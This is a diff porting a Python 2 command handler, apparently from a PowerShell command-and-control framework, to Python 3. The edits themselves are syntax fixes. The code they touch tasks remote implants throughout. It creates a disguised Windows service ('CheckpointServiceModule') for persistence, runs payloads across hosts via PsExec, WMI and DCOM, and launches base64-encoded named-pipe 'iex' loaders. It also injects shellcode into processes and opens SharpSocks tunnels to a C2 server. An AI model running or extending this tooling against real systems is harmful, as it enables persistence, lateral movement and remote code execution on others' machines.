@@ -1,4 +1,4 @@
-import base64, re, traceback, os, sys, readline
+import base64, re, traceback, os, sys, readline, string
 from Alias import ps_alias
 from Colours import Colours
 from Utils import randomuri, validate_sleep_time
@@ -34,7 +34,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         print (Colours.RED)
         print ("**OPSEC Warning**")
         impid = get_implantdetails(randomuri)
-        ri = raw_input("Do you want to continue running - %s? (y/N) " % command)
+        ri = input("Do you want to continue running - %s? (y/N) " % command)
         if ri.lower() == "n":
           command = ""
         if ri == "":
@@ -62,8 +62,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
 
     elif "searchhelp" in command.lower():
       searchterm = (command.lower()).replace("searchhelp ","")
-      import string
-      helpful = string.split(posh_help, '\n')
+      helpful = posh_help.split('\n')
       for line in helpful:
         if searchterm in line.lower():
           print (line)
@@ -117,7 +116,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
 
     elif "get-system-withdaisy" in command.lower():
       C2 = get_c2server_all()
-      daisyname = raw_input("Payload name required: ")
+      daisyname = input("Payload name required: ")
       if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
         with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
         cmd =  "sc.exe create CPUpdaterMisc binpath= 'cmd /c %s' Displayname= CheckpointServiceModule start= auto" % payload
@@ -141,7 +140,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
       new_task(cmd, user, randomuri)
 
     elif "quit" in command.lower():
-      ri = raw_input("Are you sure you want to quit? (Y/n) ")
+      ri = input("Are you sure you want to quit? (Y/n) ")
       if ri.lower() == "n":
         startup(user)
       if ri == "":
@@ -162,7 +161,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
 
     elif "invoke-psexecdaisypayload" in command.lower():
       check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
-      daisyname = raw_input("Payload name required: ")
+      daisyname = input("Payload name required: ")
       if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
         with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
         params = re.compile("invoke-psexecdaisypayload ", re.IGNORECASE)
@@ -198,7 +197,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
 
     elif "invoke-wmidaisypayload" in command.lower():
       check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
-      daisyname = raw_input("Name required: ")
+      daisyname = input("Name required: ")
       if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
         with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
         params = re.compile("invoke-wmidaisypayload ", re.IGNORECASE)
@@ -234,7 +233,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         startup(user, "Need to run createproxypayload first")
 
     elif "invoke-dcomdaisypayload" in command.lower():
-      daisyname = raw_input("Name required: ")
+      daisyname = input("Name required: ")
       if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
         with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
         p = re.compile(r'(?<=-target.).*')
@@ -257,7 +256,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
 
     # runas payloads
     elif "invoke-runasdaisypayload" in command.lower():
-      daisyname = raw_input("Name required: ")
+      daisyname = input("Name required: ")
       if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
         with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
         new_task("$proxypayload = \"%s\"" % payload, user, randomuri)
@@ -266,7 +265,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         params = re.compile("invoke-runasdaisypayload ", re.IGNORECASE)
         params = params.sub("", command)
         pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSDaisy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
-        pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params,base64.b64encode(pipe.encode('UTF-16LE')))
+        pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params,base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
         new_task(pscommand, user, randomuri)
       else:
         startup(user, "Need to run createdaisypayload first")
@@ -287,7 +286,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         params = re.compile("invoke-runasproxypayload ", re.IGNORECASE)
         params = params.sub("", command)
         pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
-        pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params,base64.b64encode(pipe.encode('UTF-16LE')))
+        pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params,base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
         new_task(pscommand, user, randomuri)
 
     elif "invoke-runaspayload" in command.lower():
@@ -296,7 +295,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
       params = re.compile("invoke-runaspayload ", re.IGNORECASE)
       params = params.sub("", command)
       pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
-      pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params,base64.b64encode(pipe.encode('UTF-16LE')))
+      pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params,base64.b64encode(pipe.encode('UTF-16LE')).decode("utf-8"))
       new_task(pscommand, user, randomuri)
 
     elif command.lower() == "help" or command == "?" or command.lower() == "help ":
@@ -332,7 +331,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         while not os.path.isfile(source):
           print("File does not exist: %s" % source)
           source = readfile_with_completion("Location of file to upload: ")
-        destination = raw_input("Location to upload to: ")
+        destination = input("Location to upload to: ")
       else:
         args = argp(command)
         source = args.source
@@ -342,7 +341,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         with open(source, "rb") as source_file:
           s = source_file.read()
         if s:
-          sourceb64 = base64.b64encode(s)
+          sourceb64 = base64.b64encode(s).decode("utf-8")
           destination = destination.replace("\\","\\\\")
           print ("")
           print ("Uploading %s to %s" % (source, destination))
@@ -359,7 +358,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
 
     elif "kill-implant" in command.lower() or "exit" in command.lower():
       impid = get_implantdetails(randomuri)
-      ri = raw_input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
+      ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
       if ri.lower() == "n":
         print ("Implant not terminated")
       if ri == "":
@@ -402,7 +401,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
       params = params.sub("", command)
       check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
       readline.set_completer(shellcodefilecomplete)
-      path = raw_input("Location of shellcode file: ")
+      path = input("Location of shellcode file: ")
       t = tabCompleter()
       t.createListCompleter(COMMANDS)
       readline.set_completer(t.listCompleter)
@@ -410,7 +409,7 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         shellcodefile = load_file(path)
         if shellcodefile != None:
           arch = "64"
-          new_task("$Shellcode%s=\"%s\" #%s" % (arch,base64.b64encode(shellcodefile), os.path.basename(path)), user, randomuri)
+          new_task("$Shellcode%s=\"%s\" #%s" % (arch,base64.b64encode(shellcodefile).decode("utf-8"), os.path.basename(path)), user, randomuri)
           new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)
       except Exception as e:
         print ("Error loading file: %s" % e)
@@ -435,24 +434,25 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
       from random import choice
       allchar = string.ascii_letters
       channel = "".join(choice(allchar) for x in range(25))
-      sharpkey = gen_key()
+      sharpkey = gen_key().decode("utf-8")
       sharpurls = get_sharpurls()
       sharpurl = select_item("HostnameIP", "C2Server")
       implant = get_implantdetails(randomuri)
       if "Daisy" in implant[15]:
-        print ""
-        print "Daisy Implant Detected:"
-        print ""
-        sharpurl = raw_input("[+] What is the DaisyServer URL: ")
+        print ("")
+        print ("Daisy Implant Detected:")
+        print ("")
+        sharpurl = input("[+] What is the DaisyServer URL: ")
 
       print (POSHDIR+"SharpSocks/SharpSocksServerCore -c=%s -k=%s --verbose -l=%s\r\n" % (channel,sharpkey,SocksHost)+Colours.GREEN)
-      ri = raw_input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
+      ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
       if ri.lower() == "n":
         print("")        
       if ri == "":
         new_task("Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 2000" % (sharpurl,channel,sharpkey,sharpurls), user, randomuri)
       if ri.lower() == "y":
         new_task("Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 2000" % (sharpurl,channel,sharpkey,sharpurls), user, randomuri)
+      update_label("SharpSocks", randomuri)
 
     elif (command.lower() == "history") or command.lower() == "history ":
       startup(user, get_history())
@@ -490,13 +490,12 @@ def migrate(randomuri, user, params=""):
     path = "%spayloads/Posh_v4_x%s_Shellcode.bin" % (ROOTDIR,arch)
     shellcodefile = load_file(path)
   elif "Daisy" in implant_comms:
-    daisyname = raw_input("Name required: ")
+    daisyname = input("Name required: ")
     path = "%spayloads/%sPosh_v4_x%s_Shellcode.bin" % (ROOTDIR,daisyname,arch)
     shellcodefile = load_file(path)
   elif "Proxy" in implant_comms:
     path = "%spayloads/ProxyPosh_v4_x%s_Shellcode.bin" % (ROOTDIR,arch)
     shellcodefile = load_file(path)
-
   check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
-  new_task("$Shellcode%s=\"%s\" #%s" % (arch,base64.b64encode(shellcodefile), os.path.basename(path)), user, randomuri)
+  new_task("$Shellcode%s=\"%s\" #%s" % (arch,base64.b64encode(shellcodefile).decode("utf-8"), os.path.basename(path)), user, randomuri)
   new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)
